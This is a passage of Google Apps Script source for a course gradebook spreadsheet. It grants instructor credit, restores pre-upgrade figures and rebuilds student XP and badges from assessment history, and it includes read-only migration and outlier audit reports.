      '"' + gate + '" is not in the answer key, so it cannot be credited.\n\n' +
      'This is the same rule the migration follows: an activity the server does ' +
      'not define does not exist.', ui.ButtonSet.OK);
    logSec_(code, '', 'grantCredit', 'REJECTED', 'Unknown activity: ' + gate + ' by ' + who, '');
    return;
  }

  var sh  = sheet_(SH_CODES);
  var rec = sh.getRange(row, 1, 1, CODES_HEADERS.length).getValues()[0];
  var st  = readState_(rec);

  if (st.gates[gate]) {
    ui.alert('Already credited',
      code + ' is already recorded as having completed ' + gate + '. Nothing was changed.',
      ui.ButtonSet.OK);
    return;
  }

  var r3 = ui.prompt('Grant activity credit (3 of 3)',
    'About to credit:\n\n' +
    '   Student:   ' + String(rec[C.NAME - 1] || '(unclaimed)') + '\n' +
    '   Code:      ' + code + '\n' +
    '   Activity:  ' + gate + '  (' + spec.xp + ' XP)\n\n' +
    'Their XP will go from ' + st.xp + ' to ' + (st.xp + spec.xp) + '.\n\n' +
    'Type GRANT to confirm:', ui.ButtonSet.OK_CANCEL);
  if (r3.getSelectedButton() !== ui.Button.OK) return;
  if (String(r3.getResponseText() || '').trim().toUpperCase() !== 'GRANT') {
    ui.alert('Cancelled', 'Nothing was changed.', ui.ButtonSet.OK);
    return;
  }

  var lock = LockService.getScriptLock();
  try { lock.waitLock(20000); } catch (e) {
    ui.alert('Busy', 'The server is busy. Please try again in a moment.', ui.ButtonSet.OK);
    return;
  }
  try {
    rec = sh.getRange(row, 1, 1, CODES_HEADERS.length).getValues()[0];
    st  = readState_(rec);
    if (st.gates[gate]) { ui.alert('Already credited', 'Nothing was changed.', ui.ButtonSet.OK); return; }

    st.gates[gate] = true;
    st.xp += spec.xp;
    if (spec.badgeOnClear) addBadges_(st, [spec.badgeOnClear]);
    awardCompletionBadges_(st);
    writeState_(sh, row, st, new Date());

    /* Provenance, in two places: the security log and the student's own
       assessment history, so the credit is never mistaken for something the
       student demonstrated. */
    appendRows_(SH_ASSESS, [[
      new Date(), code, String(rec[C.NAME - 1] || ''), String(rec[C.SECTION - 1] || ''),
      spec.mod + String(spec.lesson), gate, spec.type, 'Instructor credit',
      'COMPLETED', '', spec.xp, '', 'GRANTED by ' + (who || 'instructor'), new Date()
    ]]);
    logSec_(code, '', 'grantCredit', 'GRANTED',
            gate + ' (+' + spec.xp + ' XP) granted by ' + (who || 'unknown account'), '');
  } finally {
    lock.releaseLock();
  }

  ui.alert('Credited',
    code + ' has been credited with ' + gate + '.\n\n' +
    'Logged in SecurityLog against ' + (who || 'your account') + ', and recorded in ' +
    'Assessments as an instructor credit rather than as work the student demonstrated.',
    ui.ButtonSet.OK);
}

/**
 * Puts the pre-upgrade dashboard figures back, from the _PreMigration column.
 *
 * The upgrade replaces columns 10–21 with figures rebuilt from history. This
 * undoes exactly that, and nothing else — the trusted state in columns 25+ is
 * left in place, so the numbers will be restated again on each student's next
 * sync. It exists so that "the new figures look wrong" is a recoverable
 * situation without reaching for a backup file.
 */
function restorePreMigration() {
  var ui = SpreadsheetApp.getUi();
  var res = ui.alert('Restore pre-upgrade figures',
    'This copies each student\'s ORIGINAL dashboard figures (XP, accuracy, ' +
    'badges, progress…) back from the hidden _PreMigration column.\n\n' +
    'Those figures came from the old build, where the browser reported its own ' +
    'scores — they are not verified. Anything a student earns from now on is ' +
    'graded server-side and will overwrite them again on their next sync.\n\n' +
    'Continue?', ui.ButtonSet.YES_NO);
  if (res !== ui.Button.YES) return;

  var sh = sheetRO_(SH_CODES);
  if (!sh || sh.getLastRow() < 2) { ui.alert('Nothing to restore.'); return; }

  var rows = sh.getRange(2, 1, sh.getLastRow() - 1, CODES_HEADERS.length).getValues();
  var n = 0;
  for (var r = 0; r < rows.length; r++) {
    var raw = String(rows[r][C.PREMIG - 1] || '');
    if (!raw) continue;
    var p;
    try { p = JSON.parse(raw); } catch (e) { continue; }
    if (p.xp === undefined) continue;

    rows[r][C.MINUTES - 1]  = p.minutes;
    rows[r][C.XP - 1]       = p.xp;
    rows[r][C.LEVEL - 1]    = p.level;
    rows[r][C.RANK - 1]     = p.rank;
    rows[r][C.ACC - 1]      = p.acc;
    rows[r][C.CORRECT - 1]  = p.correct;
    rows[r][C.ATTEMPTS - 1] = p.attempts;
    rows[r][C.STREAK - 1]   = p.streak;
    rows[r][C.BADGE_N - 1]  = p.badges;
    rows[r][C.BADGE_L - 1]  = p.badgeList;
    rows[r][C.LESSONS - 1]  = p.lessons;
    rows[r][C.PROGRESS - 1] = p.progress;
    rows[r][C.ACTS - 1]     = p.acts;
    n++;
  }
  sheet_(SH_CODES).getRange(2, 1, rows.length, CODES_HEADERS.length).setValues(rows);
  SpreadsheetApp.flush();
  ui.alert('Restored',
    n + ' row(s) were put back to their pre-upgrade figures.\n\n' +
    'The server-side record in the hidden columns was not changed, so these ' +
    'numbers will be recomputed the next time each student syncs.',
    ui.ButtonSet.OK);
}

/**
 * Rebuilds a student's trusted state from their Assessments history alone.
 *
 * NOTHING here reads the AccessCodes dashboard. That is the whole point: under
 * the old build the dashboard was written from a browser-supplied snapshot, so
 * every figure on it is an assertion, not a record. The Assessments tab is the
 * closest thing to evidence we have — append-only rows, each naming a specific
 * activity — and this function will only credit what those rows can support.
 *
 * THE XP RULE
 *
 *   xp = Σ over the SET of activities history proves were completed
 *          ( answer key's xp for that activity )
 *      + Σ over server-written REPLAY rows
 *          ( the award this server itself recorded, clamped )
 *
 * The first term is a sum over a SET, not over rows. However many rows
 * describe the same activity — a duplicate from a sync retry, a second
 * COMPLETED because the student cleared their browser and worked through it
 * again, a REPLAY of a speed round — the activity is worth its answer-key
 * value exactly once. Feeding the same history in twice cannot change the
 * result, which is what makes reconstruction idempotent.
 *
 * The second term is the only way a repeat adds anything, and it is
 * deliberately narrow. It requires a row this server wrote (the Verified
 * column is present only on those), and it uses the amount that server
 * computed and stored at the time. It is clamped to the replay rate the
 * grading code can actually pay, so a corrupted cell cannot inflate it. No
 * legacy row can qualify: REPLAY did not exist in the old build, and the old
 * client never populated XP Awarded, so it is 0 on every historical row.
 *
 * Not taken from the dashboard, and not taken from the XP Awarded column of a
 * legacy row — that column is 0 for an honest student and 0 for a fabricated
 * record alike, so it distinguishes nothing.
 *
 * What this means in practice:
 *   · A student whose history shows m1-gal, m2-dnd and m2-kc gets
 *     40 + 60 + 75 = 175 XP. Their work is preserved in full.
 *   · The same student, with those three activities recorded five times over,
 *     still gets 175.
 *   · A student with 999999 XP on the dashboard and no recognisable completed
 *     activity gets 0. Nobody had to name them.
 *   · First-try and flawless-run bonuses are NOT reconstructed. Whether a clear
 *     was clean cannot be established from a legacy row, so the rebuilt figure
 *     is a floor: a legitimate student may come out slightly under what they
 *     had. That difference is reported as unrecoverable, not as wrongdoing.
 *
 * @param {Object} h  one code's history bucket from migrationPlan_
 * @return {Object}   a state object of the same shape readState_() returns
 */
function reconstructState_(h) {
  var gateList = [], g;
  for (g in h.gates) if (h.gates.hasOwnProperty(g)) gateList.push(g);
  gateList.sort();

  /* Term 1 — the course's own valuation of each DISTINCT activity completed. */
  var xp = 0;
  for (var i = 0; i < gateList.length; i++) {
    var spec = gateSpec_(gateList[i]);
    if (spec) xp += spec.xp;
  }

  /* Term 2 — replays this server graded and paid for itself. */
  var replays = h.replayAwards || [];
  for (i = 0; i < replays.length; i++) {
    var rs = gateSpec_(replays[i].gate);
    if (!rs || rs.type !== 'boss') continue;         // only speed rounds pay on replay
    if (!h.gates[replays[i].gate]) continue;         // and only once cleared
    var cap = Math.round(rs.xp * 0.35);
    var amt = Number(replays[i].award) || 0;
    if (amt > 0) xp += Math.min(amt, cap);
  }

  /* Best streak: the longest unbroken run of correct answers, in the order the
     rows were recorded. Falls back to 0 when there are no answer-level rows to
     read — safer than inheriting a number nobody can check. */
  var streak = 0, run = 0;
  var ordered = h.answers.slice().sort(function (a, b) { return a.t - b.t; });
  for (var k = 0; k < ordered.length; k++) {
    if (ordered[k].ok) { run++; if (run > streak) streak = run; }
    else run = 0;
  }

  var st = {
    xp: xp,
    correct: h.correct,
    attempts: h.attempts,
    streak: streak,
    run: 0,
    gates: {},
    badges: {},
    tries: {},
    gateList: gateList
  };
  for (i = 0; i < gateList.length; i++) st.gates[gateList[i]] = true;
  /* Key order is sorted so the serialised _ServerTries cell is byte-identical
     however the Assessments rows happened to be ordered. Without this the
     migration is still idempotent in substance but not in the text it writes,
     which makes a re-run look like a change when it is not. */
  st.tries = sortedMap_(h.tries);

  /* Per-activity answer record, which is what makes a "no misses" claim
     checkable: the old build logged a WRONG row against the activity every
     time a student got something wrong inside it. */
  st.byGate = {};
  for (k = 0; k < h.answers.length; k++) {
    var ag = h.answers[k].gate;
    if (!ag) continue;
    if (!st.byGate[ag]) st.byGate[ag] = { rows: 0, wrong: 0 };
    st.byGate[ag].rows++;
    if (!h.answers[k].ok) st.byGate[ag].wrong++;
  }

  /* Badges the history demonstrates. The old Badge List is never imported —
     "the dashboard says 15 badges" is not evidence of anything. But where the
     history DOES show a clean run, the badge is earned and is awarded here,
     so an honest student gets theirs back. */
  var earned = [];
  for (i = 0; i < gateList.length; i++) {
    var s = gateSpec_(gateList[i]);
    if (!s) continue;

    /* Awarded simply for finishing the activity. */
    if (s.badgeOnClear) earned.push(s.badgeOnClear);
    if (s.type === 'boss') earned.push('boss');

    /* Awarded for finishing it with no misses. Only where answer-level rows
       for this activity survive AND none of them is a miss — otherwise the
       condition is unproven and the badge is not granted. */
    var rec = st.byGate[gateList[i]];
    var cleanRun = !!rec && rec.rows > 0 && rec.wrong === 0;
    if (cleanRun) {
      if (s.badgeOnPerfect) earned.push(s.badgeOnPerfect);
      if (s.badgeOnClean)   earned.push(s.badgeOnClean);
      if (s.claimBadges) for (var c = 0; c < s.claimBadges.length; c++) earned.push(s.claimBadges[c]);
      if (s.type === 'boss') earned.push('perfect-boss');
    }
  }
  if (gateList.length) earned.push('first-steps');
  if (streak >= 5) earned.push('combo5');
  addBadges_(st, earned);
  awardCompletionBadges_(st);

  return st;
}

/**
 * Works out WHY a badge landed in the state it did, from the evidence alone.
 *
 * A fallback for when AnswerKey.gs is a revision behind and its
 * classifyLegacyBadge_ returns a state but no reason code. Deriving it here,
 * from the same gate set and per-activity answer record the classifier used,
 * means the outlier breakdown stays truthful regardless of which revision of
 * the key file happens to be loaded — instead of reporting every contradiction
 * as "OTHER", which is what happens when a missing property meets a `|| 'OTHER'`.
 *
 * Mirrors the classifier's branches; it does not decide the state, only the
 * label for a state already decided.
 */
function reasonFor_(id, state, st) {
  if (!BADGE_NAMES.hasOwnProperty(id)) return 'UNKNOWN_BADGE';
  if (state === 'PROVEN') return 'DEMONSTRATED';

  var ev = (typeof BADGE_EVIDENCE !== 'undefined') ? BADGE_EVIDENCE[id] : null;
  if (!ev) return 'NO_RULE';

  if (ev.condition === 'clear')    return 'NOT_COMPLETED';
  if (ev.condition === 'complete') return 'MODULE_INCOMPLETE';
  if (ev.condition === 'streak5')  {
    return (Number(st.attempts) === 0) ? 'NO_ANSWER_ROWS' : 'STREAK_SHORT';
  }
  if (ev.condition === 'noMiss') {
    var byGate = st.byGate || {}, cleared = 0, unchecked = 0;
    for (var i = 0; i < ev.gates.length; i++) {
      var g = ev.gates[i];
      if (!st.gates[g]) continue;
      cleared++;
      var rec = byGate[g];
      if (!rec || !rec.rows) unchecked++;
    }
    if (!cleared)  return 'NOT_COMPLETED';
    if (unchecked) return 'NO_ANSWER_ROWS';
    return 'MISS_RECORDED';
  }
  return 'NO_RULE';
}

/**
 * Classifies every badge the old dashboard claimed into PROVEN / UNVERIFIED /
 * CONTRADICTED. Reads the legacy "Badge List" cell; never writes anything.
 *
 * @return {{proven:Array, unverified:Array, contradicted:Array, unreadable:number}}
 */
function auditLegacyBadges_(legacyList, legacyCount, st) {
  var out = { proven: [], unverified: [], contradicted: [], unreadable: 0 };

  var names = String(legacyList || '').split(',');
  var seen = {};
  for (var i = 0; i < names.length; i++) {
    var nm = names[i].trim();
    if (!nm) continue;
    var id = badgeIdByName_(nm);
    if (!id) {
      /* A name this course does not define. It cannot have been earned here. */
      out.contradicted.push({ id: nm, name: nm, code: 'UNKNOWN_BADGE',
                              why: 'not a badge this course defines' });
      continue;
    }
    if (seen[id]) continue;
    seen[id] = true;

    var v = classifyLegacyBadge_(id, st, st.byGate || {});
    /* The reason code has to travel with the item — the outlier report counts
       by it, and without it every contradiction falls into "OTHER".
       classifyLegacyBadge_ lives in AnswerKey.gs, so if that file is a revision
       behind this one it returns no code at all. Rather than let the report
       quietly say "OTHER 150", derive the reason here from the same evidence. */
    var item = { id: id, name: BADGE_NAMES[id], why: v.why,
                 code: v.code || reasonFor_(id, v.state, st) };
    if (v.state === 'PROVEN') out.proven.push(item);
    else if (v.state === 'UNVERIFIED') out.unverified.push(item);
    else out.contradicted.push(item);
  }

  /* A badge COUNT with no list behind it, or a count larger than the list,
     claims badges that cannot even be named — nothing to check, and nothing
     supporting them. */
  var named = out.proven.length + out.unverified.length + out.contradicted.length;
  out.unreadable = Math.max(0, Number(legacyCount || 0) - named);

  return out;
}

/**
 * The most XP a student could hold above the reconstructed figure and still be
 * entirely honest.
 *
 * Reconstruction deliberately does not pay first-try or flawless-run bonuses,
 * because a legacy row cannot show a clean run. That means an honest student
 * who earned those bonuses comes out slightly under their old total — and
 * without this allowance, every one of them would be flagged as
 * "unsubstantiated", which would bury the rows that actually matter.
 *
 * So: a shortfall this size or smaller is explainable and is not flagged. The
 * rebuilt figure is still the one that gets written — this only governs whether
 * you are asked to look at the row.
 */
function explainableBonus_(gateList) {
  var n = 0;
  for (var i = 0; i < gateList.length; i++) {
    var s = gateSpec_(gateList[i]);
    if (!s) continue;
    n += (s.bonusFirstTry || 0) + (s.bonusClean || 0);
    /* A cleared speed round may have been replayed for a further 35% each time.
       One replay's worth is a fair allowance before we call it suspicious. */
    if (s.type === 'boss') n += Math.round(s.xp * 0.35);
  }
  return n;
}

/** A copy of an object with its keys in sorted order, for stable serialisation. */
function sortedMap_(o) {
  var keys = [], k;
  for (k in o) if (o.hasOwnProperty(k)) keys.push(k);
  keys.sort();
  var out = {};
  for (var i = 0; i < keys.length; i++) out[keys[i]] = o[keys[i]];
  return out;
}

/** Milliseconds for a cell that may be a Date, a string, or blank. */
function dateNum_(v) {
  if (!v) return 0;
  var t = (typeof v.getTime === 'function') ? v.getTime() : new Date(v).getTime();
  return isFinite(t) ? t : 0;
}

/** Highest XP the course can award in a single clean pass (no replays). */
function maxAwardableXp_() {
  var all = allGates_(), total = 0;
  for (var i = 0; i < all.length; i++) {
    var s = gateSpec_(all[i]);
    total += s.xp + (s.bonusFirstTry || 0) + (s.bonusClean || 0);
  }
  return total;
}

/** A sheet if it exists, or null. Never creates one — unlike sheet_(). */
function sheetRO_(name) { return ss_().getSheetByName(name) || null; }

/**
 * READ-ONLY migration audit. Run this BEFORE "② Upgrade database".
 *
 * Reports exactly what the upgrade would change, which students' progress can
 * be proven from their own history, and which rows deserve a look first. It
 * writes nothing at all — no cells, no tabs, no properties — so it is safe to
 * run on live data as many times as you like.
 *
 * The full report goes to the Apps Script log (Ctrl+Enter, or View ▸ Logs).
 * The dialog shows the summary.
 */
function auditMigration() {
  var ui;
  try { ui = SpreadsheetApp.getUi(); } catch (e) { ui = null; }

  var plan = migrationPlan_();
  var L = [];
  function line(s) { L.push(s == null ? '' : s); }
  function rule(t) { line(''); line('── ' + t + ' ' + Array(Math.max(2, 64 - t.length)).join('─')); }

  line('AAP101 · MIGRATION DRY RUN');
  line(new Date().toString());
  line('NOTHING WAS WRITTEN. This is a preview.');

  if (!plan.ok) {
    line('');
    line('✋ ' + plan.reason);
    var early = L.join('\n');
    Logger.log(early);
    if (ui) ui.alert('Migration dry run', early, ui.ButtonSet.OK);
    return early;
  }

  /* ── A. Schema ── */
  rule('A. SCHEMA CHANGES');
  if (plan.schema.alreadyUpgraded) {
    line('✅ AccessCodes already has all ' + CODES_HEADERS.length + ' columns. No header changes.');
  } else {
    line('The following columns would be ADDED to the right of your existing ones.');
    line('Nothing in columns 1–24 is renamed, moved or cleared.');
    line('');
    for (var i = 0; i < plan.schema.headerAdds.length; i++) {
      line('   + column ' + plan.schema.headerAdds[i].col + '  ' + plan.schema.headerAdds[i].name);
    }
  }
  line('');
  line(plan.schema.securityLogMissing ? '   + new tab: ' + SH_SEC : '   ✅ ' + SH_SEC + ' tab already exists');
  line(plan.schema.assessColsToAdd
    ? '   + ' + plan.schema.assessColsToAdd + ' header cell(s) on ' + SH_ASSESS + ' (existing rows untouched)'
    : '   ✅ ' + SH_ASSESS + ' headers already current');

  /* ── B. Rows ── */
  rule('B. ROWS');
  line('   Access codes on the sheet ....... ' + plan.totals.codes);
  line('   Claimed by a student ............ ' + plan.totals.claimed);
  line('   Never used ...................... ' + plan.totals.unused);
  line('   Already migrated (skipped) ...... ' + plan.totals.alreadyMigrated);
  line('   Would be seeded now ............. ' + plan.totals.toSeed);
  line('');
  line('   Activities rebuilt from history . ' + plan.totals.gatesRebuilt);
  line('');
  line('   XP — these are two different totals:');
  line('     (A) Legacy dashboard total ..... ' + plan.totals.legacyXpTotal);
  line('         What the sheet says today. Preserved in _PreMigration and');
  line('         then replaced. This is NOT what students end up with.');
  line('     (B) Rebuilt total → _ServerXP .. ' + plan.totals.rebuiltXpTotal);
  line('         What history and the answer key support. This IS what gets');
  line('         written, and what the dashboard will show.');
  line('     Difference (B − A) ............. ' +
       (plan.totals.rebuiltXpTotal - plan.totals.legacyXpTotal));
  line('');
  line('   Students whose XP changes ....... ' + plan.totals.xpChanged +
       ' of ' + plan.totals.toSeed);
  line('     goes up ....................... ' + plan.totals.xpIncreased);
  line('     goes down ..................... ' + plan.totals.xpDecreased);
  if (plan.totals.largestDecrease) {
    var ld = plan.totals.largestDecrease;
    line('   Largest decrease ................ ' + ld.delta + '   (' + ld.code + ' ' +
         (ld.name || '') + ': ' + ld.from + ' → ' + ld.to + ')');
  }
  if (plan.totals.largestIncrease) {
    var li = plan.totals.largestIncrease;
    line('   Largest increase ................ +' + li.delta + '   (' + li.code + ' ' +
         (li.name || '') + ': ' + li.from + ' → ' + li.to + ')');
  } else {
    line('   Largest increase ................ none in this data');
  }
  if (plan.totals.xpIncreased) {
    line('');
    line('   An increase is not an error. A student who cleared their browser had');
    line('   their on-screen XP reset to zero, but their completed activities were');
    line('   already recorded in Assessments — so reconstruction gives back work the');
    line('   old dashboard had lost.');
  }
  line('');
  line('   Legacy badge claims, by what the history says about each:');
  line('     PROVEN ........................ ' + plan.totals.badgesProven +
       '   → kept, and written to _ServerBadges');
  line('     UNVERIFIED .................... ' + plan.totals.badgesUnverified +
       '   → cannot be shown or ruled out; archived, never counted');
  line('     CONTRADICTED .................. ' + plan.totals.badgesContradicted +
       '   → the history rules them out; archived, never counted');

  /* ── C. History ── */
  rule('C. WHERE THE REBUILT PROGRESS COMES FROM');
  line('Each student\'s completed activities are reconstructed from rows in the');
  line(SH_ASSESS + ' tab marked COMPLETED or REPLAY — their own submission');
  line('history, not an estimate.');
  line('');
  line('   ' + SH_ASSESS + ' rows scanned ......... ' + plan.history.rows);
  line('   Rows that evidence something .... ' + plan.history.usable);
  line('   Identical rows ignored .......... ' + plan.history.duplicates +
       '  (a retried sync appends its batch again — the old build had no');
  line('                                        idempotency key, so these are transport artefacts)');
  line('   Rows written by this server ..... ' + plan.history.serverWritten +
       '  (only these carry a trustworthy XP Awarded)');

  var uk = Object.keys(plan.history.unknownGates);
  if (uk.length) {
    line('');
    line('   ⚠️  Activity ids in your history that the answer key does not know.');
    line('       These are ignored. If one of these is a real activity, add it to');
    line('       AnswerKey.gs BEFORE upgrading or that progress is lost:');
    for (var u = 0; u < uk.length && u < 20; u++) {
      line('         · ' + uk[u] + '  (' + plan.history.unknownGates[uk[u]] + ' rows)');
    }
  } else {
    line('   ✅ Every activity id in your history is in the answer key.');
  }

  var orphans = Object.keys(plan.history.orphanCodes);
  if (orphans.length) {
    line('');
    line('   ⚠️  ' + orphans.length + ' code(s) appear in ' + SH_ASSESS + ' but not in AccessCodes.');
    line('       Their history cannot be attached to anyone and is ignored.');
  }

  /* ── D. Flags ── */
  rule('D1. DIFFERENCES THAT CANNOT BE REBUILT (' + plan.differences.length + ')');
  line('Expected on perfectly honest records. The old build recorded something');
  line('reconstruction has no way to derive — a first-try bonus, a "no misses"');
  line('badge, a sync that never landed. These are NOT signs of anything wrong.');
  line('The old values are kept in _PreMigration and _LegacyBadges_UNVERIFIED.');
  line('');
  if (!plan.differences.length) {
    line('   (none)');
  } else {
    for (var df = 0; df < plan.differences.length && df < 40; df++) {
      var de = plan.differences[df];
      line('   Row ' + de.rowNum + '  ' + de.code + '  ' + (de.name || '(unclaimed)'));
      for (var dq = 0; dq < de.diffs.length; dq++) line('      · ' + de.diffs[dq]);
    }
    if (plan.differences.length > 40) line('   … and ' + (plan.differences.length - 40) + ' more.');
  }

  rule('D2. FIGURES NOTHING IN THE HISTORY ACCOUNTS FOR (' + plan.flagged.length + ')');
  if (!plan.flagged.length) {
    line('✅ None. Every dashboard figure is either evidenced or explainable.');
  } else {
    line('A gap too large for any missing bonus or lost sync to explain. Worth a');
    line('look — though a broken client or a botched restore can also produce');
    line('this, so treat it as a question to ask, not a conclusion.');
    line('');
    line('None of these block the upgrade, and none of them change what it does:');
    line('every row is rebuilt from history either way.');
    line('');
    for (var f = 0; f < plan.flagged.length && f < 60; f++) {
      var e = plan.flagged[f];
      line('   Row ' + e.rowNum + '  ' + e.code + '  ' + (e.name || '(unclaimed)'));
      for (var q = 0; q < e.flags.length; q++) line('      · ' + e.flags[q]);
    }
    if (plan.flagged.length > 60) line('   … and ' + (plan.flagged.length - 60) + ' more (see the full log).');
  }

  /* ── E. Effect on the dashboard ── */
  rule('E. WHAT THE DASHBOARD WILL SAY AFTERWARDS');
  line('Every figure below is REBUILT from the student\'s own Assessments history');
  line('and the answer key. None of it is copied from the current dashboard,');
  line('because under the old build the browser reported its own scores — so');
  line('those numbers are claims, not records.');
  line('');
  line('   XP        = the answer key\'s value for each activity history proves');
  line('               was completed. First-try and flawless-run bonuses are NOT');
  line('               rebuilt (a legacy row cannot show a clean run), so a');
  line('               legitimate student may come out slightly under.');
  line('   Correct   = answer rows in Assessments naming a recognised activity.');
  line('   Attempts    Rows naming an activity the key does not know count for');
  line('               nothing at all.');
  line('   Streak    = longest run of correct answers in the recorded order,');
  line('               or 0 when there are no answer rows to read.');
  line('   Badges    = only those the rebuilt activity set demonstrates. The old');
  line('               badge list is not imported.');
  line('');
  line('The old figures are written to the hidden _PreMigration column first, and');
  line('"↩ Restore pre-upgrade figures…" in this menu puts them all back.');
  line('');
  var shown = 0;
  line('   Row  Code              XP now → rebuilt    Acts now → proven   Prog now → rebuilt');
  for (var d = 0; d < plan.rows.length && shown < 25; d++) {
    var x = plan.rows[d];
    if (!x.claimed) continue;
    line('   ' + pad_(x.rowNum, 4) + ' ' + pad_(x.code, 17) +
         pad_(x.dashboard.xp, 8) + '→ ' + pad_(x.seed.xp, 10) +
         pad_(x.dashboard.activities, 9) + '→ ' + pad_(x.seed.gates.length, 10) +
         pad_(x.dashboard.progress + '%', 9) + '→ ' + x.derived.progress + '%');
    shown++;
  }
  if (!shown) line('   (no claimed codes yet)');
  line('');
  line('   Correct/attempts and badges, same rows:');
  shown = 0;
  for (d = 0; d < plan.rows.length && shown < 25; d++) {
    x = plan.rows[d];
    if (!x.claimed) continue;
    line('   ' + pad_(x.rowNum, 4) + ' ' + pad_(x.code, 17) +
         pad_(x.dashboard.correct + '/' + x.dashboard.attempts, 12) + '→ ' +
         pad_(x.seed.correct + '/' + x.seed.attempts, 12) +
         pad_(x.dashboard.badges + ' badges', 12) + '→ ' + x.derived.badgeCount + ' badges');
    shown++;
  }

  /* ── F. Verdict ── */
  rule('F. VERDICT');
  var blocking = uk.length > 0;
  if (!plan.totals.toSeed) {
    line('✅ NOTHING TO DO — every row is already migrated.');
  } else if (blocking) {
    line('⚠️  ONE THING TO CHECK FIRST.');
    line('');
    line('   Your history contains activity ids the answer key does not have,');
    line('   listed in section C. Ask yourself one question about each:');
    line('');
    line('     "Is this a real activity that used to be in the module?"');
    line('');
    line('   YES — add it back to AnswerKey.gs BEFORE upgrading, or the students');
    line('         who completed it will not get credit for it.');
    line('');
    line('   NO  — it is junk: a broken row, or a record that did not come from');
    line('         the module at all. Nothing needs doing. It is already being');
    line('         ignored, which is exactly what should happen, and you are');
    line('         safe to proceed.');
    line('');
    line('   ' + plan.totals.toSeed + ' row(s) would be rebuilt. No access code, name, section,');
    line('   device or Assessments row is touched either way.');
  } else {
    line('✅ SAFE TO PROCEED.');
    line('   ' + plan.totals.toSeed + ' row(s) would be seeded. No existing column is');
    line('   renamed, moved, cleared or overwritten.');
  }
  line('');
  line('Before you run the real upgrade: File ▸ Make a copy.');
  line('Then: AAP101 Database ▸ ③ Upgrade database.');
  line('');
  line('── Nothing above was written to the spreadsheet. ──');

  var msg = L.join('\n');
  Logger.log(msg);

  if (ui) {
    /* The dialog cannot hold the whole thing; give the verdict and point at the log. */
    var brief = [
      'NOTHING WAS WRITTEN — this is a preview.', '',
      'Access codes ............ ' + plan.totals.codes,
      'Would be seeded ......... ' + plan.totals.toSeed,
      'Already migrated ........ ' + plan.totals.alreadyMigrated,
      'Legacy XP total (A) ..... ' + plan.totals.legacyXpTotal + '  → _PreMigration only',
      'Rebuilt XP total (B) .... ' + plan.totals.rebuiltXpTotal + '  → _ServerXP',
      'XP changes .............. ' + plan.totals.xpChanged + ' student(s)',
      'Activities rebuilt ...... ' + plan.totals.gatesRebuilt,
      'Unrebuildable diffs ..... ' + plan.differences.length + '  (expected, not suspicious)',
      'Unaccounted figures ..... ' + plan.flagged.length + '  (worth a look)',
      'Duplicate rows ignored .. ' + plan.history.duplicates, '',
      plan.schema.alreadyUpgraded
        ? 'Schema: already up to date.'
        : 'Schema: ' + plan.schema.headerAdds.length + ' column(s) would be added to the right.',
      '',
      (!plan.totals.toSeed ? '✅ Nothing to do.'
        : blocking ? '⚠️ REVIEW FIRST — unknown activity ids in your history.'
                   : '✅ Safe to proceed.'),
      '',
      'The full row-by-row report is in the Apps Script log:',
      'Extensions ▸ Apps Script ▸ Executions, or press Ctrl+Enter in the editor.'
    ].join('\n');
    ui.alert('Migration dry run (read-only)', brief, ui.ButtonSet.OK);
  }
  return msg;
}

function pad_(v, n) {
  var s = String(v);
  while (s.length < n) s += ' ';
  return s;
}

/**
 * READ-ONLY outlier analysis. Writes nothing — no cells, no tabs, no
 * properties. Uses the same migrationPlan_() as the migration itself, so the
 * figures are the ones that would actually be written.
 *
 * Rows whose history contains NOT ONE recognised activity are reported
 * separately throughout, rather than mixed in with the rest. That is a
 * property of the evidence, not a list of names: a record the module cannot
 * account for at all is a different kind of thing from a record that merely
 * lost a bonus, and averaging the two together hides both.
 *
 * Full report goes to the Apps Script log (Extensions ▸ Apps Script, Ctrl+Enter).
 */
function auditOutliers() {
  var ui;
  try { ui = SpreadsheetApp.getUi(); } catch (e) { ui = null; }

  var plan = migrationPlan_();
  var L = [];
  function line(s) { L.push(s == null ? '' : s); }
  function rule(t) { line(''); line('── ' + t + ' ' + Array(Math.max(2, 66 - t.length)).join('─')); }

  line('AAP101 · MIGRATION OUTLIER ANALYSIS — READ ONLY, NOTHING WAS WRITTEN');
  line(new Date().toString());

  if (!plan.ok) {
    line(''); line('✋ ' + plan.reason);
    var early = L.join('\n');
    Logger.log(early);
    if (ui) ui.alert('Outlier analysis', early, ui.ButtonSet.OK);
    return early;
  }

  /* Split by whether the history accounts for anything at all. */
  var ordinary = [], noEvidence = [];
  for (var i = 0; i < plan.rows.length; i++) {
    var r = plan.rows[i];
    if (!r.willSeed || !r.claimed) continue;
    if (r.evidence.gateRows === 0 && r.evidence.answerRows === 0) noEvidence.push(r);
    else ordinary.push(r);
  }
  var dropped = ordinary.filter(function (r) { return r.seed.xp < r.dashboard.xp; });
  var gained  = ordinary.filter(function (r) { return r.seed.xp > r.dashboard.xp; });
  function byDrop(a, b) { return (a.seed.xp - a.dashboard.xp) - (b.seed.xp - b.dashboard.xp); }
  function byGain(a, b) { return (b.seed.xp - b.dashboard.xp) - (a.seed.xp - a.dashboard.xp); }
  dropped.sort(byDrop);
  gained.sort(byGain);

  function row(r) {
    var d = r.seed.xp - r.dashboard.xp;
    return '   ' + pad_(r.code, 16) + pad_((r.name || '').slice(0, 20), 22) +
           pad_(r.dashboard.xp, 9) + pad_(r.seed.xp, 9) + pad_((d > 0 ? '+' : '') + d, 9);
  }
  function heads() {
    line('   ' + pad_('Code', 16) + pad_('Student', 22) + pad_('Legacy', 9) +
         pad_('Rebuilt', 9) + pad_('Diff', 9));
  }
  function reasons(r) {
    var all = r.diffs.concat(r.flags);
    for (var q = 0; q < all.length; q++) line('        · ' + all[q].split('.')[0]);
    if (!all.length) line('        · (no flags — difference is entirely unreconstructable bonus)');
  }

  /* ── 1 ── */
  rule('1. TOP 20 XP DECREASES (records with recognised history)');
  if (!dropped.length) line('   (none)');
  heads();
  for (i = 0; i < dropped.length && i < 20; i++) { line(row(dropped[i])); reasons(dropped[i]); }

  /* ── 2 ── */
  rule('2. TOP 10 XP INCREASES');
  if (!gained.length) {
    line('   (none)');
  } else {
    line('   An increase means reconstruction found work the old dashboard had');
    line('   lost — typically a student who cleared their browser.');
    heads();
    for (i = 0; i < gained.length && i < 10; i++) line(row(gained[i]));
  }

  /* ── 3 ── */
  rule('3. FLAG COMPOSITION AMONG THE ' + dropped.length + ' DECREASING RECORDS');
  function has(r, needle, where) {
    var arr = (where === 'flags') ? r.flags : r.diffs;
    for (var q = 0; q < arr.length; q++) if (arr[q].indexOf(needle) === 0) return true;
    return false;
  }
